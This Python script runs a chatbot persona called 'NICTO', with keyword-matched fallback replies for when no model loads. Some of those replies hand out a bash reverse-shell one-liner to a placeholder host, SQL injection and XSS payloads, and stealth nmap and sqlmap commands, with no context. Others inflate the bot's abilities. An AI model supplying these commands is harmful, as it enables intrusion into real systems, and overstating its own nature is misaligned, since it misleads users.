#!/usr/bin/env python3
"""
NICTO Real AI — Dual-Mode Inference Engine
CPU mode: loads small model locally (Qwen/Llama-1B 4-bit)
GPU mode: loads Unsloth-fine-tuned model
"""
import json, os, sys, re, argparse
from pathlib import Path

HERE = Path(__file__).parent
CONFIG_PATH = HERE / "hardware_config.json"
MODEL_DIR = HERE / "nicto_outputs" / "models"

SYSTEM_PROMPT = (
    "You are NICTO, an advanced autonomous AI system. Your core purpose is to assist, learn, "
    "and evolve through conversation. You are truthful, direct, and precise. You have expertise "
    "in cybersecurity, programming, AI/ML, mathematics, game development, system administration, "
    "networking, databases, cloud computing, and DevOps. You reason step-by-step, admit uncertainty, "
    "and never fabricate information. You are built by Stephen Wahogo in Nairobi, Kenya."
)


def load_config():
    if CONFIG_PATH.exists():
        with open(CONFIG_PATH) as f:
            return json.load(f)
    return {}


class NICTOInference:
    def __init__(self, mode: str = "auto"):
        self.mode = mode
        self.config = load_config()
        self.model = None
        self.tokenizer = None
        self.is_loaded = False

    def _check_gpu(self):
        try:
            import torch
            return torch.cuda.is_available()
        except ImportError:
            return False

    def _load_cpu(self):
        """Load small CPU model using transformers."""
        model_name = self.config.get("base_model", "Qwen/Qwen2.5-1.5B-Instruct")
        cpu_models = {
            "Qwen/Qwen2.5-1.5B-Instruct": "Qwen 2.5 1.5B",
            "meta-llama/Llama-3.2-1B-Instruct": "Llama 3.2 1B",
            "microsoft/Phi-3-mini-4k-instruct": "Phi-3-mini 3.8B",
        }
        display = cpu_models.get(model_name, model_name)
        print(f"Loading {display} (CPU 4-bit)...")

        try:
            from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig
            import torch

            quantization_config = BitsAndBytesConfig(
                load_in_4bit=True,
                bnb_4bit_compute_dtype=torch.float16,
                bnb_4bit_quant_type="nf4",
            )

            self.tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
            self.model = AutoModelForCausalLM.from_pretrained(
                model_name,
                quantization_config=quantization_config,
                device_map="auto",
                trust_remote_code=True,
            )
            self.is_loaded = True
            print(f"  Loaded: {display}")
        except ImportError:
            print("  transformers not installed. Installing...")
            os.system("pip install transformers torch bitsandbytes accelerate")
            return self._load_cpu()
        except Exception as e:
            print(f"  Could not load model: {e}")
            print("  Running in fallback mode (pattern-based responses).")

    def _load_gpu(self):
        """Load Unsloth fine-tuned model."""
        # Check for merged model first, then LoRA
        merged_path = MODEL_DIR / "nicto_lora_merged"
        lora_path = MODEL_DIR / "nicto_lora"

        if merged_path.exists():
            model_path = str(merged_path)
            print(f"Loading merged model from {model_path}")
            try:
                from unsloth import FastLanguageModel
                self.model, self.tokenizer = FastLanguageModel.from_pretrained(
                    model_path, max_seq_length=2048, dtype=None, load_in_4bit=True
                )
                FastLanguageModel.for_inference(self.model)
                self.is_loaded = True
                return
            except Exception as e:
                print(f"  Merged model load failed: {e}")

        if lora_path.exists():
            print(f"Loading LoRA adapters from {lora_path}")
            try:
                base = self.config.get("base_model", "Qwen/Qwen2.5-1.5B-Instruct")
                from unsloth import FastLanguageModel
                self.model, self.tokenizer = FastLanguageModel.from_pretrained(
                    base, max_seq_length=2048, dtype=None, load_in_4bit=True
                )
                from peft import PeftModel
                self.model = PeftModel.from_pretrained(self.model, str(lora_path))
                self.is_loaded = True
                return
            except Exception as e:
                print(f"  LoRA load failed: {e}")

        print("No fine-tuned model found. Loading base model...")
        self._load_cpu()

    def load(self):
        if self.mode == "auto":
            has_gpu = self._check_gpu()
            self.mode = "gpu" if has_gpu else "cpu"

        print(f"NICTO Inference — Mode: {self.mode}")
        if self.mode == "gpu":
            self._load_gpu()
        else:
            self._load_cpu()

    def generate(self, prompt: str, max_tokens: int = 512, temperature: float = 0.7) -> str:
        if not self.is_loaded:
            return self._fallback_generate(prompt)

        chat = [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ]

        try:
            text = self.tokenizer.apply_chat_template(chat, tokenize=False)
            import torch
            inputs = self.tokenizer([text], return_tensors="pt").to(self.model.device)
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=max_tokens,
                temperature=temperature,
                top_p=0.9,
                do_sample=True,
            )
            response = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
            # Extract assistant response
            if "<|im_start|>assistant" in response:
                response = response.split("<|im_start|>assistant")[-1]
            response = response.replace("<|im_end|>", "").strip()
            return response
        except Exception as e:
            return self._fallback_generate(prompt, error=str(e))

    def _fallback_generate(self, prompt: str, error: str = None) -> str:
        """Pattern-based fallback when no model is available."""
        prompt_lower = prompt.lower()

        # Identity
        if any(w in prompt_lower for w in ["who are you", "what are you", "your name"]):
            return "I am NICTO — an advanced autonomous AI system created by Stephen Wahogo in Nairobi, Kenya. I combine autonomous reasoning with deep domain knowledge to assist with complex technical tasks."

        # Cybersecurity
        if any(w in prompt_lower for w in ["nmap", "scan port", "port scan"]):
            return "To scan ports: `nmap -sS -sV -O target.com`. SYN stealth (`-sS`), version detection (`-sV`), OS detection (`-O`). For all ports: `nmap -p- --min-rate=1000 target.com`."
        if any(w in prompt_lower for w in ["reverse shell", "shell"]):
            return "Reverse shell: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`. Listener: `nc -lvnp 4444`. The target connects outbound, bypassing inbound firewall rules."
        if any(w in prompt_lower for w in ["sql injection", "sqli"]):
            return "Test SQLi with `' OR 1=1 --` and `' UNION SELECT NULL--`. Automate with sqlmap: `sqlmap -u 'http://target.com/page?id=1' --batch --dbs`."
        if any(w in prompt_lower for w in ["xss", "cross site"]):
            return "XSS test payloads: `<script>alert('XSS')</script>` (reflected), `<img src=x onerror=alert(1)>` (stored via comment/profile). Types: stored, reflected, DOM-based."

        # Programming
        if "python" in prompt_lower and "decorator" in prompt_lower:
            return "A decorator wraps a function: `@decorator` is sugar for `func = decorator(func)`. Example: `@timer` logs execution time. Decorators with args use nested functions."
        if "lambda" in prompt_lower:
            return "Lambda: anonymous inline function — `lambda x: x * 2`. Limited to a single expression. Equivalent to `def double(x): return x * 2`."
        if "async" in prompt_lower or "await" in prompt_lower:
            return "`async def` creates a coroutine. `await` suspends until completion. Event loop manages concurrency. `asyncio.gather()` runs multiple I/O-bound tasks concurrently."

        # Math
        if "binary search" in prompt_lower:
            return "Binary search: O(log n). Each step halves the search space. For an array of 1 billion elements, at most 30 comparisons."
        if "big o" in prompt_lower or "complexity" in prompt_lower:
            return "Big O: O(1) constant, O(log n) logarithmic, O(n) linear, O(n log n) linearithmic, O(n²) quadratic, O(2ⁿ) exponential, O(n!) factorial."
        if "dynamic programming" in prompt_lower or "dp" == prompt_lower.strip():
            return "DP: solve problems by breaking into overlapping subproblems, store results. Top-down (memoization, recursion + cache) or bottom-up (tabulation, iterative). Classic: Fibonacci, knapsack, LCS."

        # Generic
        if any(w in prompt_lower for w in ["hello", "hi", "hey", "greetings"]):
            return "Hello! I'm NICTO. I can help with cybersecurity, programming, AI/ML, math, game development, and more. What can I assist you with?"
        if "what can you do" in prompt_lower:
            return "I can reason about complex problems, write and review code, analyze security vulnerabilities, explain AI/ML concepts, generate 3D games, build projects, and continuously learn. I have 12+ cognitive subsystems for reasoning, memory, learning, and self-improvement."
        if "thank" in prompt_lower:
            return "You're welcome! Let me know if you need anything else."

        return f"I understand your question about \"{prompt[:100]}...\" As NICTO, I process this through my cognitive architecture. Could you provide more detail so I can give you a more precise answer?"

    def chat(self):
        print("\nNICTO Interactive Mode (type 'exit' to quit)\n")
        while True:
            try:
                prompt = input("You: ").strip()
                if prompt.lower() in ("exit", "quit", "bye"):
                    print("NICTO: Goodbye!")
                    break
                if not prompt:
                    continue
                response = self.generate(prompt)
                print(f"\nNICTO: {response}\n")
            except (KeyboardInterrupt, EOFError):
                print("\nNICTO: Goodbye!")
                break

    def get_status(self) -> dict:
        return {
            "mode": self.mode,
            "loaded": self.is_loaded,
            "config": self.config,
        }


def main():
    parser = argparse.ArgumentParser(description="NICTO Inference Engine")
    parser.add_argument("--mode", choices=["auto", "cpu", "gpu"], default="auto")
    parser.add_argument("--prompt", "-p", help="Single prompt mode")
    parser.add_argument("--max-tokens", type=int, default=512)
    parser.add_argument("--temperature", type=float, default=0.7)
    args = parser.parse_args()

    nicto = NICTOInference(mode=args.mode)
    nicto.load()

    if args.prompt:
        response = nicto.generate(args.prompt, max_tokens=args.max_tokens, temperature=args.temperature)
        print(response)
    else:
        nicto.chat()


if __name__ == "__main__":
    main()
